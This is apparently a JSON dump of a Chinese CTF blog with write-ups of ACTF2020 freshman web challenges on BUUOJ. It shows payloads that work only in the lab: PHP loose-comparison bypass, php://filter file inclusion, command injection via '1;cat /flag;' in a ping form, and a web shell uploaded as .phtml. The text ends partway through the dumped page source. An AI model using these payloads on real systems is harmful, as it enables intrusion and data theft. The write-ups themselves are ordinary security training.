[{"url":"/2021/09/02/%E6%9C%AA%E5%91%BD%E5%90%8D/","content":""},{"title":"ACTF2020 新生赛-BackupFile","url":"/2021/08/30/ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile/","content":"<p><a href=\"https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]BackupFile\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>我分配到的主机是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://c25ca069-842d-4e3f-ba55-e0e81096dbec.node4.buuoj.cn:81/</span><br></pre></td></tr></table></figure>\n<p>打开来，没啥重要的信息，源码也没东西：<br><img src=\"/images/Writeup/20210830193517.png\"><br>根据题目，尝试获取index.php的备份文件。成功了：<br><img src=\"/images/Writeup/20210830193548.png\"><br>获取到了一份php代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include_once</span> <span class=\"string\">&quot;flag.php&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$key</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!is_numeric(<span class=\"variable\">$key</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(<span class=\"string\">&quot;Just num!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$key</span> = intval(<span class=\"variable\">$key</span>);</span><br><span class=\"line\">    <span class=\"variable\">$str</span> = <span class=\"string\">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$key</span> == <span class=\"variable\">$str</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Try to find out source file!&quot;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>那么无脑先尝试一下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://c25ca069-842d-4e3f-ba55-e0e81096dbec.node4.buuoj.cn:81/?key=123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3</span><br></pre></td></tr></table></figure>\n<p>返回了”Just num!“，结合上面的代码，应该是只要前面的数字部分：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://c25ca069-842d-4e3f-ba55-e0e81096dbec.node4.buuoj.cn:81/?key=123</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Writeup/20210830194010.png\"><br>flag:~~flag{4678282c-fd05-408c-917f-6885b938a490} ~~</p>\n","categories":["Web","PHP代码审计"]},{"title":"ACTF2020 新生赛-Include","url":"/2021/08/30/ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B-Include/","content":"<p><a href=\"https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Include\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>我分配到的主机是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://9cf680dc-54b5-4807-aa54-dfc0273f65db.node4.buuoj.cn:81</span><br></pre></td></tr></table></figure>\n<p>打开，发现就一个tips：<br><img src=\"/images/Writeup/20210830072303.png\"><br><img src=\"/images/Writeup/20210830072315.png\"></p>\n<blockquote>\n<p>考察利用php://filter伪协议进行文件包含<br>构造payload = <a href=\"http://5165ec02-c72d-4737-85c5-295e639ea759.node3.buuoj.cn/?file=php://filter/read=convert.base64-encode/resource=flag.php\">http://5165ec02-c72d-4737-85c5-295e639ea759.node3.buuoj.cn/?file=php://filter/read=convert.base64-encode/resource=flag.php</a><br>————————————————<br>版权声明：本文为CSDN博主「黑仔丶」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href=\"https://blog.csdn.net/qq_42404383/article/details/107946738\">https://blog.csdn.net/qq_42404383/article/details/107946738</a><br>访问，得到一串密文：<br><img src=\"/images/Writeup/20210830072453.png\"><br>base64解码，得到：</p>\n</blockquote>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;Can you find out the flag?&quot;</span>;</span><br><span class=\"line\"><span class=\"comment\">//flag&#123;7054babe-8911-4f25-85a9-32d5e4023b85&#125;</span></span><br></pre></td></tr></table></figure>\n<p>flag:<del>flag{7054babe-8911-4f25-85a9-32d5e4023b85}</del><br>其实思路就是flag写在了源文件的注释里面，然后需要读取源文件的内容，而不是读取经过编码后的内容（编码时注释不会加载进去）</p>\n","categories":["Web","PHP代码审计"]},{"title":"ACTF2020 新生赛-Exec","url":"/2021/08/30/ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B-Exec/","content":"<p><a href=\"https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Exec\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>我分配到的主机是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://c3c90b43-0f44-43b6-88d1-e18fc3307132.node4.buuoj.cn:81/</span><br></pre></td></tr></table></figure>\n<p>打开来，是一个ping的网页：<br><img src=\"/images/Writeup/20210830150841.png\"><br>看起来不像是数据库类型，怀疑是Linux指令执行，用；或者|来执行多个指令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1;ls /;</span><br><span class=\"line\">1|ls /;</span><br></pre></td></tr></table></figure>\n<p>得到目录下的文件信息：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">bin</span><br><span class=\"line\">dev</span><br><span class=\"line\">etc</span><br><span class=\"line\">flag</span><br><span class=\"line\">home</span><br><span class=\"line\">lib</span><br><span class=\"line\">media</span><br><span class=\"line\">mnt</span><br><span class=\"line\">opt</span><br><span class=\"line\">proc</span><br><span class=\"line\">root</span><br><span class=\"line\">run</span><br><span class=\"line\">sbin</span><br><span class=\"line\">srv</span><br><span class=\"line\">sys</span><br><span class=\"line\">tmp</span><br><span class=\"line\">usr</span><br><span class=\"line\">var</span><br></pre></td></tr></table></figure>\n<p>然后构建playload读取flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1;cat /flag;</span><br></pre></td></tr></table></figure>\n<p>flag:<del>flag{56130bee-181c-43c0-abb8-f9639eec35fb}</del></p>\n","categories":["Web","RCE"]},{"title":"ACTF2020 新生赛-Upload","url":"/2021/08/27/ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/","content":"<p><a href=\"https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Upload\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>我分配到的主机是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://79f86a20-8009-4135-a557-870901c134d6.node4.buuoj.cn:81</span><br></pre></td></tr></table></figure>\n<p>打开链接，发现是上传：<br><img src=\"/images/Writeup/20210827154822.png\"><br>用[[一句话)以php格式上传一下试试：<br><img src=\"/images/Writeup/20210827154947.png\"><br>看来是行不通，看看源码，发现有一个本地文件后缀过滤：<br><img src=\"/images/Writeup/20210827155039.png\"><br>删掉过滤的代码，再试图上传：<br><img src=\"/images/Writeup/20210827155130.png\"><br>看来还存在云端的后缀检测，用phtml试试看：<br><img src=\"/images/Writeup/20210827155352.png\"><br>看来是成功了，访问一下试试：<br><img src=\"/images/Writeup/20210827155422.png\"><br>就成功得到了flag。<br>flag:<del>flag{a34db48e-3826-434a-8817-8f275c246066}</del><br>当然，传了马，也要试试连接一下：<br><img src=\"/images/Writeup/20210827155632.png\"><br>得到index.php的源码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>你有解题思路了嘛？<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">&quot;stylesheet&quot;</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;css/style.css&quot;</span> <span class=\"attr\">media</span>=<span class=\"string\">&quot;screen&quot;</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text/css&quot;</span> /&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text/javascript&quot;</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;./js/main.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;sitemakers&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;wrap&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">svg</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;bulb&quot;</span> <span class=\"attr\">version</span>=<span class=\"string\">&quot;1.1&quot;</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://www.w3.org/2000/svg&quot;</span> <span class=\"attr\">xmlns:xlink</span>=<span class=\"string\">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class=\"attr\">x</span>=<span class=\"string\">&quot;0px&quot;</span> <span class=\"attr\">y</span>=<span class=\"string\">&quot;0px&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;128px&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">\t <span class=\"attr\">height</span>=<span class=\"string\">&quot;128px&quot;</span> <span class=\"attr\">viewBox</span>=<span class=\"string\">&quot;0 0 128 128&quot;</span> <span class=\"attr\">enable-background</span>=<span class=\"string\">&quot;new 0 0 128 128&quot;</span> <span class=\"attr\">xml:space</span>=<span class=\"string\">&quot;preserve&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">g</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;s-bulb&quot;</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">g</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">path</span> <span class=\"attr\">fill-rule</span>=<span class=\"string\">&quot;evenodd&quot;</span> <span class=\"attr\">clip-rule</span>=<span class=\"string\">&quot;evenodd&quot;</span> <span class=\"attr\">d</span>=<span class=\"string\">&quot;M104.145,42.922c-0.258-9.541-3.436-19.458-10.576-27.913</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\t\tC88.695,9.245,82.706,5.05,75.47,2.746c-3.798-1.209-7.682-1.965-11.683-1.916c-3.553,0.043-7.022,0.693-10.406,1.747</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\t\tc-9.279,2.88-16.414,8.597-21.776,16.625C28.182,24.328,26.107,29.98,24.958,36c-0.742,3.904-1.014,7.844-0.657,11.804</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\t\tc0.858,9.513,4,18.144,10.17,25.542c2.009,2.413,4.117,4.748,5.545,7.566c1.062,2.094,1.989,4.256,2.942,6.4</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\t\tc1.076,2.427,2.774,4.205,5.371,4.859c1.925,0.485,3.702,1.281,5.499,2.063c2.902,1.265,5.809,2.526,8.709,3.795</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\t\tc2.195,0.955,4.388,1.918,6.581,2.884c2.589,1.138,5.17,2.287,7.762,3.413c1.31,0.57,2.841,0.235,3.577-0.708</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\t\tc1.095-1.397,0.673-3.48-1.087-4.271c-1.669-0.753-3.345-1.488-5.019-2.222c-2.038-0.891-4.08-1.776-6.12-2.666</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\t\tc-2.604-1.136-5.216-2.268-7.821-3.411c-2.003-0.878-4-1.771-6.005-2.644c-1.102-0.479-2.207-0.95-3.326-1.39</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\t\tc-0.417-0.161-0.891-0.179-1.308-0.344c-0.764-0.298-1.278-0.869-1.553-1.646c-1.768-4.971-4.392-9.464-7.759-13.508</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\t\tc-1.509-1.809-3.09-3.554-4.336-5.57c-3.335-5.383-5.46-11.171-6.052-17.516c-0.915-9.789,1.291-18.79,6.863-26.889</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\t\tc4.957-7.208,11.708-12.015,20.204-14.157c6.392-1.611,12.689-1.011,18.773,1.573c9.279,3.942,15.587,10.785,19.488,19.984</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\t\tc2.296,5.405,3.22,11.05,3.011,16.889c-0.317,8.925-3.272,16.896-8.946,23.792c-2.068,2.513-4.124,5.015-5.803,7.807</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\t\tc-1.402,2.332-2.552,4.787-3.472,7.349c-0.474,1.314-1.366,2.028-2.757,2.188c-0.928,0.106-1.761,0.435-2.275,1.309</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\t\tc-0.89,1.508-0.273,3.811,1.588,4.196c1.883,0.39,3.575-0.188,5.144-1.113c1.738-1.026,2.893-2.557,3.605-4.471</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\t\tc1.734-4.653,4.226-8.836,7.528-12.581c4.964-5.618,8.227-12.141,9.869-19.48C103.665,51.369,104.143,47.883,104.145,42.922z&quot;</span>/&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">path</span> <span class=\"attr\">fill-rule</span>=<span class=\"string\">&quot;evenodd&quot;</span> <span class=\"attr\">clip-rule</span>=<span class=\"string\">&quot;evenodd&quot;</span> <span class=\"attr\">d</span>=<span class=\"string\">&quot;M77.257,116.188c0.884,0.346,1.702,0.202,2.46-0.188</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\t\tc0.947-0.494,1.366-1.401,1.348-2.405c-0.02-1.136-0.615-2.013-1.687-2.491c-1.944-0.869-3.899-1.721-5.848-2.575</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\t\tc-1.709-0.747-3.419-1.491-5.13-2.234c-2.676-1.171-5.354-2.338-8.028-3.509c-2.347-1.031-4.684-2.087-7.038-3.102</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\t\tc-0.792-0.343-1.614-0.626-2.435-0.891c-0.897-0.287-2.432,0.154-2.961,1.172c-0.715,1.37-0.362,3.355,1.264,4.016</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\t\tc2.498,1.021,4.943,2.155,7.415,3.23c2.935,1.281,5.875,2.56,8.81,3.84c2.003,0.878,3.997,1.774,6.002,2.646</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\t\tc0.324,0.139,0.452,0.309,0.4,0.68c-0.46,3.388-2.759,5.917-6.027,6.749c-3.471,0.886-7.294-1.126-8.787-4.443</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\t\tc-0.481-1.063-0.592-2.182-0.792-3.296c-0.254-1.407-1.227-2.001-2.529-2.222c-0.908-0.151-2.159,0.46-2.663,1.422</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\t\tc-0.438,0.83-0.415,1.74-0.272,2.663c0.696,4.489,2.935,7.963,6.953,10.109c3.115,1.666,6.446,2.109,9.915,1.108</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\t\tc5.003-1.449,8.154-4.682,9.476-9.707C77.146,116.592,77.19,116.428,77.257,116.188z&quot;</span>/&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">g</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">g</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">g</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;www-filament&quot;</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">path</span> <span class=\"attr\">fill-rule</span>=<span class=\"string\">&quot;evenodd&quot;</span> <span class=\"attr\">clip-rule</span>=<span class=\"string\">&quot;evenodd&quot;</span> <span class=\"attr\">d</span>=<span class=\"string\">&quot;M82.985,29.716c0.897-0.62,1.849-0.822,2.957-0.547</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc1.471,0.363,2.109,1.95,1.953,3.176c-0.134,1.05-0.666,1.823-1.564,2.383c-0.25,0.155-0.498,0.438-0.585,0.712</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc-0.553,1.734-1.059,3.483-1.584,5.222c-1.027,3.403-2.059,6.806-3.089,10.205c-0.604,1.997-1.211,3.989-1.814,5.985</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc-1.007,3.331-2.012,6.67-3.021,10.001c-0.741,2.449-1.484,4.895-2.227,7.345c-1.016,3.353-2.025,6.708-3.051,10.062</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc-0.217,0.716-0.948,1.105-1.604,0.909c-0.719-0.215-1.057-0.821-0.822-1.608c1.04-3.506,2.104-7.005,3.151-10.508</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc0.364-1.205,0.724-2.423,1.126-3.771c-0.78,0.522-1.44,0.955-2.093,1.4c-0.971,0.659-2.496,0.685-3.463-0.059</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc-1.034-0.789-2.072-1.576-3.105-2.36c-1.011,0.771-2.009,1.495-2.968,2.274c-1.044,0.847-2.709,0.815-3.751,0.048</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc-0.78-0.574-1.604-1.091-2.516-1.7c0.321,1.07,0.595,2.012,0.879,2.952c1.155,3.807,2.311,7.614,3.46,11.425</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc0.084,0.283,0.161,0.6,0.131,0.887c-0.055,0.601-0.562,1.034-1.146,1.081c-0.543,0.045-1.157-0.374-1.344-0.949</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc-0.223-0.688-0.418-1.38-0.628-2.069c-1.357-4.498-2.712-8.995-4.074-13.494c-2.142-7.073-4.292-14.143-6.432-21.218</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc-0.945-3.118-1.818-6.26-2.834-9.356c-0.494-1.505-0.604-3.163-1.934-4.375c-0.766-0.701-0.747-1.802-0.425-2.832</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc0.275-0.885,0.818-1.444,1.703-1.732c1.167-0.381,2.189-0.102,3.155,0.579c0.963,0.675,1.942,1.331,2.909,2.001</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc1.774,1.23,3.548,2.467,5.34,3.713c0.854-0.667,1.69-1.326,2.526-1.98c2.092-1.639,4.174-3.288,6.276-4.914</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc0.789-0.609,2.453-0.664,3.224-0.089c1.265,0.942,2.491,1.93,3.729,2.9c1.731,1.358,3.462,2.715,5.197,4.082</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tC77.429,33.558,80.204,31.632,82.985,29.716z M76.578,46.931c0.969-0.69,1.972-1.112,3.223-0.72</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc0.871-2.883,1.733-5.738,2.598-8.592c-0.037-0.027-0.071-0.052-0.107-0.082c-0.538,0.37-1.078,0.729-1.615,1.101</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc-1.452,1.002-2.898,2.017-4.356,3.011c-1.11,0.759-2.634,0.747-3.716-0.083c-1.969-1.515-3.91-3.071-5.864-4.604</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc-0.852-0.669-1.703-1.334-2.583-2.02c-1.043,0.813-2.09,1.621-3.129,2.439c-1.82,1.425-3.612,2.896-5.469,4.276</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc-0.99,0.738-2.432,0.763-3.523,0.02c-1.913-1.306-3.813-2.632-5.719-3.947c-0.295-0.206-0.593-0.406-1.044-0.714</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc0.96,3.179,1.871,6.201,2.794,9.26c0.205-0.032,0.395-0.032,0.566-0.086c1.027-0.336,1.94-0.049,2.781,0.529</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc1.647,1.127,3.29,2.26,4.912,3.415c0.35,0.255,0.56,0.217,0.875-0.037c1.671-1.344,3.368-2.654,5.042-3.993</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc1.141-0.916,2.937-0.785,4.069,0.181c1.643,1.404,3.388,2.689,5.091,4.024c0.042,0.033,0.102,0.047,0.187,0.083</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tC73.242,49.245,74.926,48.105,76.578,46.931z M58.842,56.22c-1.109,0.887-2.681,0.887-3.8,0.103</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc-1.462-1.027-2.936-2.034-4.404-3.048c-0.141-0.099-0.283-0.189-0.567-0.375c0.981,3.251,1.921,6.36,2.869,9.502</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc0.791-0.181,1.538-0.45,2.304-0.103c0.256,0.118,0.54,0.186,0.773,0.334c0.95,0.628,1.891,1.271,2.826,1.924</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc0.253,0.175,0.43,0.189,0.693-0.025c0.866-0.709,1.776-1.363,2.642-2.074c1.126-0.928,2.846-0.918,3.977,0.019</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc0.864,0.716,1.772,1.371,2.641,2.077c0.246,0.201,0.415,0.177,0.647,0.017c0.734-0.512,1.478-1,2.207-1.517</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc0.595-0.423,1.191-0.828,1.945-0.873c0.422-0.024,0.845-0.004,1.382-0.004c0.854-2.827,1.741-5.768,2.629-8.712</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc-0.035-0.022-0.074-0.045-0.11-0.066c-1.198,0.829-2.402,1.652-3.601,2.488c-0.624,0.432-1.232,0.851-2.021,0.982</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc-0.781,0.128-1.497-0.009-2.094-0.452c-1.885-1.412-3.73-2.875-5.633-4.353C62.366,53.453,60.59,54.814,58.842,56.22z</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\t M49.028,49.956c2.344,1.648,4.709,3.274,7.077,4.887c0.628,0.428,1.043,0.387,1.659-0.094c1.708-1.326,3.414-2.657,5.121-3.987</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc0.839-0.653,1.699-0.653,2.537,0c1.704,1.331,3.409,2.661,5.121,3.987c0.615,0.481,1.028,0.522,1.658,0.094</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc2.369-1.613,4.725-3.247,7.086-4.874c0.473-0.325,0.651-0.772,0.525-1.338c-0.091-0.433-0.369-0.79-0.793-0.757</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc-0.429,0.026-0.88,0.21-1.245,0.443c-0.899,0.564-1.756,1.198-2.628,1.804c-0.794,0.555-1.589,1.109-2.388,1.659</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc-0.772,0.534-1.678,0.551-2.419-0.02c-1.791-1.381-3.56-2.781-5.33-4.185c-0.543-0.429-1.167-0.429-1.71,0</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc-1.771,1.404-3.541,2.804-5.328,4.181c-0.742,0.575-1.648,0.562-2.425,0.024c-1.653-1.146-3.304-2.295-4.958-3.439</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc-0.204-0.143-0.413-0.278-0.636-0.376c-0.814-0.355-1.507,0.114-1.61,1.089C48.567,49.361,48.733,49.747,49.028,49.956z</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\t M69.706,69.17c1.593-1.068,3.174-2.148,4.762-3.23c0.433-0.293,0.533-0.718,0.451-1.198c-0.075-0.439-0.348-0.77-0.781-0.783</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc-0.331-0.012-0.712,0.114-0.997,0.293c-0.946,0.599-1.859,1.252-2.787,1.878c-0.884,0.597-1.77,0.554-2.615-0.106</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc-0.926-0.729-1.854-1.457-2.781-2.18c-0.52-0.405-1.094-0.403-1.619,0.008c-0.927,0.722-1.851,1.449-2.779,2.176</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc-0.841,0.661-1.728,0.694-2.615,0.096c-0.913-0.617-1.818-1.245-2.732-1.857c-0.725-0.484-1.3-0.452-1.658,0.066</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc-0.386,0.562-0.22,1.265,0.432,1.712c1.502,1.037,3.008,2.06,4.521,3.081c0.596,0.396,1.035,0.381,1.624-0.062</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc0.955-0.717,1.889-1.463,2.849-2.173c0.768-0.572,1.585-0.569,2.355,0.003c0.96,0.716,1.895,1.462,2.854,2.174</span></span></span><br><span class=\"line\"><span class=\"string\"><span class=\"tag\">\t\tc0.232,0.173,0.526,0.271,0.787,0.399C69.262,69.355,69.511,69.304,69.706,69.17z&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">g</span>&gt;</span> </span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">svg</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;light&quot;</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;glow&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">enctype</span>=<span class=\"string\">&quot;multipart/form-data&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;post&quot;</span> <span class=\"attr\">onsubmit</span>=<span class=\"string\">&quot;return checkFile()&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t嘿伙计，你发现它了！</span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;input_file&quot;</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;file&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;upload_file&quot;</span>/&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;button&quot;</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;upload&quot;</span>/&gt;</span></span><br><span class=\"line\">            <span 